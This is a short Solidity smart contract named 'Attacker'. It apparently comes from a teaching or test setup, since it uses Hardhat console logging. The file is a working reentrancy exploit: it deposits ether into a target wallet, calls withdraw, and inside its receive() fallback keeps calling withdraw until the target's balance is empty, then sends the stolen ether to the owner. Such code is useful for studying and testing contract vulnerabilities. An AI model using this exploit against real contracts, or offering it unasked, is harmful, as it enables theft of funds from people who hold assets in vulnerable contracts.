// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IWallet {
  function deposit() external payable;
  function withdraw() external;
}

contract Attacker is Ownable {
  IWallet public immutable wallet;

  constructor(address walletContractAddress) {
    wallet = IWallet(walletContractAddress);
  }

  function attack() external payable onlyOwner {
    wallet.deposit{ value: msg.value }();
    wallet.withdraw();
  }

  receive() external payable {
    if (address(wallet).balance > 0) {
      console.log("");
      console.log("Reentrance...");
      wallet.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}
